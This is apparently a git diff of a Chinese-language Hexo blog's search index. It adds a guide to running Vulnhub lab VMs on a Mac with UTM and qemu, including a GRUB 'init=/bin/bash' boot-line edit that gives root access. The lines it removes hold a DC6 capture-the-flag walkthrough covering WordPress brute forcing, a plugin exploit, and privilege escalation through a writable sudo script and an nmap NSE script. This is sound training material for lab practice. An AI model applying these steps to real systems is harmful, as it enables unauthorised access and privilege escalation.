-<p>接着就可以启动虚拟机了<br>启动成功的画面:<br><img src="https://pic1.imgdb.cn/item/679a4de8d0e0a243d4f87ba6.png"></p>
-<h2 id="靶机没有分配到ip解决方案"><a href="#靶机没有分配到ip解决方案" class="headerlink" title="靶机没有分配到ip解决方案"></a>靶机没有分配到ip解决方案</h2><p>靶机启动后  nmap扫描当前网段发现主机ip 但是有的靶机没有分配到靶机<br>这是由于靶机中的使用的网卡和其配置文件中的网卡不匹配导致的</p>
-<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="VIM"><figure class="iseeu highlight /vim"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~]</span><br><span class="line">└─# <span class="keyword">nmap</span> -<span class="keyword">sn</span> <span class="number">192.168</span>.<span class="number">240.0</span>/<span class="number">24</span></span><br><span class="line">Starting Nmap <span class="number">7.95</span> ( https://<span class="keyword">nmap</span>.org ) at <span class="number">2025</span>-<span class="number">01</span>-<span class="number">29</span> <span class="number">23</span>:<span class="number">50</span> CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> bogon (<span class="number">192.168</span>.<span class="number">240.52</span>)</span><br><span class="line">Host <span class="keyword">is</span> <span class="keyword">up</span> (<span class="number">0.0049</span>s latency).</span><br><span class="line">MAC Address: <span class="number">0</span>E:CB:C5:<span class="number">05</span>:B8:<span class="number">1</span>B (Unknown)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> bogon (<span class="number">192.168</span>.<span class="number">240.82</span>)</span><br><span class="line">Host <span class="keyword">is</span> <span class="keyword">up</span> (<span class="number">0.00041</span>s latency).</span><br><span class="line">MAC Address: <span class="number">3</span>A:<span class="number">03</span>:<span class="number">50</span>:<span class="number">5</span>A:<span class="number">8</span>C:DF (Unknown)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> bogon (<span class="number">192.168</span>.<span class="number">240.83</span>)</span><br><span class="line">Host <span class="keyword">is</span> <span class="keyword">up</span>.</span><br><span class="line">Nmap done: <span class="number">256</span> IP addresses (<span class="number">3</span> hosts <span class="keyword">up</span>) scanned in <span class="number">2.41</span> seconds</span><br></pre></td></tr></table></figure></div>
-<p>比如我这里这三个ip都不是靶机</p>
-<h3 id="debian系解决方案"><a href="#debian系解决方案" class="headerlink" title="debian系解决方案"></a>debian系解决方案</h3><p>这时 先关闭靶机 在启动的蓝色界面 按e进入命令行模式<br>（如果一直没有出现这个蓝色界面说明不是debian系的，在启动的时候按shift也能进入这个界面）<br>光标下移  找到ro（这里的倒数第三行） 改成rw single init&#x3D;&#x2F;bin&#x2F;bash<br>ctrl + x 进入命令行模式<br><img src="https://pic1.imgdb.cn/item/679a51aad0e0a243d4f87be5.png"><br><img src="https://pic1.imgdb.cn/item/679a51abd0e0a243d4f87be6.png"><br><img src="https://pic1.imgdb.cn/item/679a51abd0e0a243d4f87be7.png"></p>
-<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LIVECODESERVER"><figure class="iseeu highlight /livecodeserver"><table><tr><td class="code"><pre><span class="line">ip <span class="keyword">a</span> <span class="comment">#查看实际使用网卡 (我这里就是enp0s1)</span></span><br></pre></td></tr></table></figure></div>
-<p><img src="https://pic1.imgdb.cn/item/679a51acd0e0a243d4f87be8.png"><br>然后输入 </p>
-<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LEAF"><figure class="iseeu highlight /leaf"><table><tr><td class="code"><pre><span class="line">nano /etc/network/interfaces <span class="punctuation">#</span><span class="params">(编辑网卡)</span></span><br></pre></td></tr></table></figure></div>
-<p>这里用nano 不用vim  vim不知道为什么在这个模式下面更改不了内容<br>然后把网卡替换成实际的网卡(enp0s3 改成 enp0s1)<br><img src="https://pic1.imgdb.cn/item/679a51acd0e0a243d4f87be9.png"><br><img src="https://pic1.imgdb.cn/item/679a5210d0e0a243d4f87bf1.png"><br>ctrl + o 保存 回车确定 最后ctrl + x 退出<br>重启网络服务</p>
-<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="EBNF"><figure class="iseeu highlight /ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">service networking restart</span></span><br></pre></td></tr></table></figure></div>
-<p>等加载之后重启虚拟机  就发现可以扫到ip啦 (如果还是不行可以尝试把utm网络中桥接的端口从自动改成en0)<br><img src="https://pic1.imgdb.cn/item/679a5211d0e0a243d4f87bf2.png"></p>
-<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="VIM"><figure class="iseeu highlight /vim"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~]</span><br><span class="line">└─# <span class="keyword">nmap</span> -<span class="keyword">sn</span> <span class="number">192.168</span>.<span class="number">240.0</span>/<span class="number">24</span></span><br><span class="line">Starting Nmap <span class="number">7.95</span> ( https://<span class="keyword">nmap</span>.org ) at <span class="number">2025</span>-<span class="number">01</span>-<span class="number">30</span> <span class="number">00</span>:<span class="number">07</span> CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> bogon (<span class="number">192.168</span>.<span class="number">240.52</span>)</span><br><span class="line">Host <span class="keyword">is</span> <span class="keyword">up</span> (<span class="number">0.035</span>s latency).</span><br><span class="line">MAC Address: <span class="number">0</span>E:CB:C5:<span class="number">05</span>:B8:<span class="number">1</span>B (Unknown)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> bogon (<span class="number">192.168</span>.<span class="number">240.82</span>)</span><br><span class="line">Host <span class="keyword">is</span> <span class="keyword">up</span> (<span class="number">0.00041</span>s latency).</span><br><span class="line">MAC Address: <span class="number">3</span>A:<span class="number">03</span>:<span class="number">50</span>:<span class="number">5</span>A:<span class="number">8</span>C:DF (Unknown)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> bogon (<span class="number">192.168</span>.<span class="number">240.135</span>)</span><br><span class="line">Host <span class="keyword">is</span> <span class="keyword">up</span> (<span class="number">0.17</span>s latency).</span><br><span class="line">MAC Address: B6:<span class="number">9</span>C:<span class="number">5</span>D:<span class="number">4</span>F:DE:AB (Unknown)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> bogon (<span class="number">192.168</span>.<span class="number">240.83</span>)</span><br><span class="line">Host <span class="keyword">is</span> <span class="keyword">up</span>.</span><br><span class="line">Nmap done: <span class="number">256</span> IP addresses (<span class="number">4</span> hosts <span class="keyword">up</span>) scanned in <span class="number">3.69</span> seconds</span><br></pre></td></tr></table></figure></div>
-<h3 id="ubuntu系统"><a href="#ubuntu系统" class="headerlink" title="ubuntu系统"></a>ubuntu系统</h3><p>如果开机的时候一直加载进度进度条，没有出现蓝色界面，说明是ubuntu系统。<br>按shift进入命令行模式<br><img src="https://pic1.imgdb.cn/item/679dd3ddd0e0a243d4f972dc.png"><br>然后按e，把ro改成 rw single init&#x3D;&#x2F;bin&#x2F;bash 并且把这行后面的都删除，直到initrd<br><img src="https://pic1.imgdb.cn/item/679dd50ed0e0a243d4f972f2.png"><br>ctrl + x开机<br>和dibian系一样用ip a查看真实ip端口<br>不一样的是这里网卡配置文件在</p>
-<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ARDUINO"><figure class="iseeu highlight /arduino"><table><tr><td class="code"><pre><span class="line">/etc/netplan/<span class="number">00</span>-installer-config.yaml</span><br></pre></td></tr></table></figure></div>
-<p>修改成真实网卡（我这里3改成1）<br><img src="https://pic1.imgdb.cn/item/679dd746d0e0a243d4f97313.png"><br>ctrl + o 回车  ctrl + x 退出</p>
-<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">source</span> /etc/netplan/00-installer-config.yaml </span><br></pre></td></tr></table></figure></div>
-<p>让修改后的文件生效</p>
-<p>然后重启靶机 就可以获取到靶机ip了</p>
-]]></content>
-      <categories>
-        <category>靶场</category>
-        <category>靶场配置</category>
-      </categories>
-      <tags>
-        <tag>工具</tag>
-        <tag>靶场</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>HMV-Pwned</title>
     <url>/posts/3123.html</url>
     <content><![CDATA[<p>HMV-Pwned靶场复盘</p>
@@ -1800,24 +1842,47 @@ root@flower:/#
       </tags>
   </entry>
   <entry>
-    <title>DC6靶场复盘</title>
-    <url>/posts/35203.html</url>
-    <content><![CDATA[<p>vulnhub-DC6靶场复盘</p>
+    <title>mac环境靶场搭建</title>
+    <url>/posts/86.html</url>
+    <content><![CDATA[<p>Mac环境下靶场搭建</p>
 <span id="more"></span>
+<p>因为我是mac m芯片电脑，所以在安装靶场时候如果直接使用virtualbox会报错，这篇文章介绍了我安装靶场的解决方案</p>
+<h2 id="utm安装"><a href="#utm安装" class="headerlink" title="utm安装"></a>utm安装</h2><p>我使用的虚拟机是utm ，可以模拟x86系统，直接在官网免费下载<br><a href="https://mac.getutm.app/">https://mac.getutm.app/</a><br><img src="https://pic1.imgdb.cn/item/679a4c5cd0e0a243d4f87b67.png"></p>
+<h2 id="靶场安装包处理"><a href="#靶场安装包处理" class="headerlink" title="靶场安装包处理"></a>靶场安装包处理</h2><p>这里以从vulnhub下载的Deathnote为例<br>从靶场下来的安装包应该是.ovf<br>在终端用tar解压这个文件  解压得到两个文件 我们需要用的是.vmdk文件</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LLVM"><figure class="iseeu highlight /llvm"><table><tr><td class="code"><pre><span class="line">(base) kakeru<span class="title">@bogon</span> downloads % tar xvf Deathnote.ova </span><br><span class="line"><span class="keyword">x</span> Deathnote.ovf</span><br><span class="line"><span class="keyword">x</span> Deathnote-disk<span class="number">001</span>.vmdk</span><br><span class="line"><span class="keyword">x</span> Deathnote.mf</span><br></pre></td></tr></table></figure></div>
 
-<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p>首先要根据vulnhub上面的提示  修改本机和kali的host文件<br>给了一个提示<br><img src="https://pic1.imgdb.cn/item/679a1d0ed0e0a243d4f875f5.png"><br>让我们扫描 先把指定的密码字典存起来   我们用bp爆破管理员账户</p>
-<h2 id="web探测"><a href="#web探测" class="headerlink" title="web探测"></a>web探测</h2><p>这个站点是用wordpress创建的 可以访问readme.html 就可以看到哪里是登录界面 一般还会有版本信息<br><img src="https://pic1.imgdb.cn/item/679a1d0ed0e0a243d4f875f6.png" alt="|450"></p>
-<p>后台登录界面就在&#x2F;wp-admin  现在就是爆破 用admin爆破    我们尝试了爆破 但是无法得到密码<br>现在用wpscan扫描 指定url 和apitoken    然后枚举用户名   <code>wpscan --url wordy --enumerate u</code><br>然后把得到的用户名存在一个文件里面  爆破用户名和密码 </p>
-<p>接着就可以登录到管理员账户<br>然后利用web上的信息拿到shell 这里要用到插件的activity monitor 插件漏洞 用searchsploit<br><img src="https://pic1.imgdb.cn/item/679a1d14d0e0a243d4f875f7.png" alt="|500"><br>利用这个漏洞   修改payload 上传到本机 在web端访问<br><img src="https://pic1.imgdb.cn/item/679a1d16d0e0a243d4f875f8.png" alt="|425"><br>然后在web端点击这个文件 就可以拿到shell<br><img src="https://pic1.imgdb.cn/item/679a1d17d0e0a243d4f875f9.png"></p>
-<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>这个www用户目录下面其实没有什么有用的东西   &#x3D;&#x3D;去&#x2F;home&#x2F;&#x3D;&#x3D; 目录下   这里可以看到其他几个用户的文件夹<br>找到jens用户 目录下有一个backup.sh<br><code>ls -al backups.sh</code><br><code>-rwxrwxr-x 1 jens devs 50 Apr 26  2019 backups.sh</code><br>可以看到devs组的人有rwx权限 所有用户都有x权限<br>然后在mark用户的文件夹下面有一个stuff文件夹 里面有一个账号密码 可以登录到ssh<br><img src="https://pic1.imgdb.cn/item/679a1d5cd0e0a243d4f87600.png"><br><code>graham@dc-6:~$ id</code><br><code>uid=1001(graham) gid=1001(graham) groups=1001(graham),1005(devs)</code><br>这个用户是属于devs这个组的 所以有写入文件的权限<br><img src="https://pic1.imgdb.cn/item/679a1d5dd0e0a243d4f87601.png" alt="|500"><br>可以发现这个用户可以不用密码就用jens用户的名义执行刚才的那个脚本<br>我们先在那个脚本文件后面加上<code>graham@dc-6:~$ echo &quot;/bin/bash&quot; &gt;&gt; /home/jens/backups.sh</code><br>这样子就可以让执行脚本的人返回shell   这样子就拿到了jens的shell<br><img src="https://pic1.imgdb.cn/item/679a1d5dd0e0a243d4f87602.png" alt="|450"><br>这个用户可以用root身份执行 nmap  所以用nmap提权<br>在网上找资料后 发现nmap可以用srcipt提权<br><img src="https://pic1.imgdb.cn/item/679a1d9dd0e0a243d4f87604.png" alt="|500"><br>或者可以把’os.execute(“&#x2F;bin&#x2F;bash”) 写到一个s.nse文件里 然后–script 传入这个文件</p>
+<p>然后下载qemu  mac用户可以用brew下载</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="MIPSASM"><figure class="iseeu highlight /mipsasm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">brew </span><span class="keyword">install </span>qemu</span><br></pre></td></tr></table></figure></div>
+<p>然后在靶场解压后的目录中执行</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="STYLUS"><figure class="iseeu highlight /stylus"><table><tr><td class="code"><pre><span class="line">qemu-<span class="selector-tag">img</span> convert -<span class="selector-tag">p</span>  -O qcow2 Deathnote-disk001<span class="selector-class">.vmdk</span> Deathnote<span class="selector-class">.qcow2</span> </span><br></pre></td></tr></table></figure></div>
+<p>执行后把.vmdk 文件转换成.qcow2文件</p>
+<h2 id="utm设置"><a href="#utm设置" class="headerlink" title="utm设置"></a>utm设置</h2><p>点击创建虚拟机 –&gt;  模拟  –&gt; 其他 进入虚拟机配置<br><img src="https://pic1.imgdb.cn/item/679a4c5ed0e0a243d4f87b68.png"><br>启动设备选择无<br><img src="https://pic1.imgdb.cn/item/679a4c5fd0e0a243d4f87b69.png"><br>修改内存  一般虚拟只要分配1g以下的内存<br><img src="https://pic1.imgdb.cn/item/679a4c5fd0e0a243d4f87b6a.png"><br>然后可以给虚拟机起个名字 点击存储<br><img src="https://pic1.imgdb.cn/item/679a4c60d0e0a243d4f87b6b.png"><br>接着右击虚拟机,点击编辑，进入虚拟机设置<br>1.在QEMU中取消UEFI启动<br><img src="https://pic1.imgdb.cn/item/679a4c98d0e0a243d4f87b6e.png"><br>2.网络选择桥接(你可以自己配置网络，桥接是最简单的)<br><img src="https://pic1.imgdb.cn/item/679a4c9ad0e0a243d4f87b6f.png"><br>3.右击IDE驱动器,删除<br><img src="https://pic1.imgdb.cn/item/679a4c9bd0e0a243d4f87b70.png"><br>4.驱动器新建点击导入 ，选择我们刚刚转换的.qcow2文件</p>
+<p>接着就可以启动虚拟机了<br>启动成功的画面:<br><img src="https://pic1.imgdb.cn/item/679a4de8d0e0a243d4f87ba6.png"></p>
+<h2 id="靶机没有分配到ip解决方案"><a href="#靶机没有分配到ip解决方案" class="headerlink" title="靶机没有分配到ip解决方案"></a>靶机没有分配到ip解决方案</h2><p>靶机启动后  nmap扫描当前网段发现主机ip 但是有的靶机没有分配到靶机<br>这是由于靶机中的使用的网卡和其配置文件中的网卡不匹配导致的</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="VIM"><figure class="iseeu highlight /vim"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~]</span><br><span class="line">└─# <span class="keyword">nmap</span> -<span class="keyword">sn</span> <span class="number">192.168</span>.<span class="number">240.0</span>/<span class="number">24</span></span><br><span class="line">Starting Nmap <span class="number">7.95</span> ( https://<span class="keyword">nmap</span>.org ) at <span class="number">2025</span>-<span class="number">01</span>-<span class="number">29</span> <span class="number">23</span>:<span class="number">50</span> CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> bogon (<span class="number">192.168</span>.<span class="number">240.52</span>)</span><br><span class="line">Host <span class="keyword">is</span> <span class="keyword">up</span> (<span class="number">0.0049</span>s latency).</span><br><span class="line">MAC Address: <span class="number">0</span>E:CB:C5:<span class="number">05</span>:B8:<span class="number">1</span>B (Unknown)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> bogon (<span class="number">192.168</span>.<span class="number">240.82</span>)</span><br><span class="line">Host <span class="keyword">is</span> <span class="keyword">up</span> (<span class="number">0.00041</span>s latency).</span><br><span class="line">MAC Address: <span class="number">3</span>A:<span class="number">03</span>:<span class="number">50</span>:<span class="number">5</span>A:<span class="number">8</span>C:DF (Unknown)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> bogon (<span class="number">192.168</span>.<span class="number">240.83</span>)</span><br><span class="line">Host <span class="keyword">is</span> <span class="keyword">up</span>.</span><br><span class="line">Nmap done: <span class="number">256</span> IP addresses (<span class="number">3</span> hosts <span class="keyword">up</span>) scanned in <span class="number">2.41</span> seconds</span><br></pre></td></tr></table></figure></div>
+<p>比如我这里这三个ip都不是靶机</p>
+<h3 id="debian系解决方案"><a href="#debian系解决方案" class="headerlink" title="debian系解决方案"></a>debian系解决方案</h3><p>这时 先关闭靶机 在启动的蓝色界面 按e进入命令行模式<br>（如果一直没有出现这个蓝色界面说明不是debian系的，在启动的时候按shift也能进入这个界面）<br>光标下移  找到ro（这里的倒数第三行） 改成rw single init&#x3D;&#x2F;bin&#x2F;bash<br>ctrl + x 进入命令行模式<br><img src="https://pic1.imgdb.cn/item/679a51aad0e0a243d4f87be5.png"><br><img src="https://pic1.imgdb.cn/item/679a51abd0e0a243d4f87be6.png"><br><img src="https://pic1.imgdb.cn/item/679a51abd0e0a243d4f87be7.png"></p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LIVECODESERVER"><figure class="iseeu highlight /livecodeserver"><table><tr><td class="code"><pre><span class="line">ip <span class="keyword">a</span> <span class="comment">#查看实际使用网卡 (我这里就是enp0s1)</span></span><br></pre></td></tr></table></figure></div>
+<p><img src="https://pic1.imgdb.cn/item/679a51acd0e0a243d4f87be8.png"><br>然后输入 </p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LEAF"><figure class="iseeu highlight /leaf"><table><tr><td class="code"><pre><span class="line">nano /etc/network/interfaces <span class="punctuation">#</span><span class="params">(编辑网卡)</span></span><br></pre></td></tr></table></figure></div>
+<p>这里用nano 不用vim  vim不知道为什么在这个模式下面更改不了内容<br>然后把网卡替换成实际的网卡(enp0s3 改成 enp0s1)<br><img src="https://pic1.imgdb.cn/item/679a51acd0e0a243d4f87be9.png"><br><img src="https://pic1.imgdb.cn/item/679a5210d0e0a243d4f87bf1.png"><br>ctrl + o 保存 回车确定 最后ctrl + x 退出<br>重启网络服务</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="EBNF"><figure class="iseeu highlight /ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">service networking restart</span></span><br></pre></td></tr></table></figure></div>
+<p>等加载之后重启虚拟机  就发现可以扫到ip啦 (如果还是不行可以尝试把utm网络中桥接的端口从自动改成en0)<br><img src="https://pic1.imgdb.cn/item/679a5211d0e0a243d4f87bf2.png"></p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="VIM"><figure class="iseeu highlight /vim"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~]</span><br><span class="line">└─# <span class="keyword">nmap</span> -<span class="keyword">sn</span> <span class="number">192.168</span>.<span class="number">240.0</span>/<span class="number">24</span></span><br><span class="line">Starting Nmap <span class="number">7.95</span> ( https://<span class="keyword">nmap</span>.org ) at <span class="number">2025</span>-<span class="number">01</span>-<span class="number">30</span> <span class="number">00</span>:<span class="number">07</span> CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> bogon (<span class="number">192.168</span>.<span class="number">240.52</span>)</span><br><span class="line">Host <span class="keyword">is</span> <span class="keyword">up</span> (<span class="number">0.035</span>s latency).</span><br><span class="line">MAC Address: <span class="number">0</span>E:CB:C5:<span class="number">05</span>:B8:<span class="number">1</span>B (Unknown)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> bogon (<span class="number">192.168</span>.<span class="number">240.82</span>)</span><br><span class="line">Host <span class="keyword">is</span> <span class="keyword">up</span> (<span class="number">0.00041</span>s latency).</span><br><span class="line">MAC Address: <span class="number">3</span>A:<span class="number">03</span>:<span class="number">50</span>:<span class="number">5</span>A:<span class="number">8</span>C:DF (Unknown)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> bogon (<span class="number">192.168</span>.<span class="number">240.135</span>)</span><br><span class="line">Host <span class="keyword">is</span> <span class="keyword">up</span> (<span class="number">0.17</span>s latency).</span><br><span class="line">MAC Address: B6:<span class="number">9</span>C:<span class="number">5</span>D:<span class="number">4</span>F:DE:AB (Unknown)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> bogon (<span class="number">192.168</span>.<span class="number">240.83</span>)</span><br><span class="line">Host <span class="keyword">is</span> <span class="keyword">up</span>.</span><br><span class="line">Nmap done: <span class="number">256</span> IP addresses (<span class="number">4</span> hosts <span class="keyword">up</span>) scanned in <span class="number">3.69</span> seconds</span><br></pre></td></tr></table></figure></div>
+<h3 id="ubuntu系统"><a href="#ubuntu系统" class="headerlink" title="ubuntu系统"></a>ubuntu系统</h3><p>如果开机的时候一直加载进度进度条，没有出现蓝色界面，说明是ubuntu系统。<br>按shift进入命令行模式<br><img src="https://pic1.imgdb.cn/item/679dd3ddd0e0a243d4f972dc.png"><br>然后按e，把ro改成 rw single init&#x3D;&#x2F;bin&#x2F;bash 并且把这行后面的都删除，直到initrd<br><img src="https://pic1.imgdb.cn/item/679dd50ed0e0a243d4f972f2.png"><br>ctrl + x开机<br>和dibian系一样用ip a查看真实ip端口<br>不一样的是这里网卡配置文件在</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ARDUINO"><figure class="iseeu highlight /arduino"><table><tr><td class="code"><pre><span class="line">/etc/netplan/<span class="number">00</span>-installer-config.yaml</span><br></pre></td></tr></table></figure></div>
+<p>修改成真实网卡（我这里3改成1）<br><img src="https://pic1.imgdb.cn/item/679dd746d0e0a243d4f97313.png"><br>ctrl + o 回车  ctrl + x 退出</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">source</span> /etc/netplan/00-installer-config.yaml </span><br></pre></td></tr></table></figure></div>
+<p>让修改后的文件生效</p>
+<p>然后重启靶机 就可以获取到靶机ip了</p>
 ]]></content>
       <categories>
         <category>靶场</category>
-        <category>vulnhub</category>
+        <category>靶场配置</category>
       </categories>
       <tags>
-        <tag>渗透</tag>
-        <tag>vulnhub</tag>
+        <tag>工具</tag>
+        <tag>靶场</tag>
       </tags>
   </entry>
   <entry>
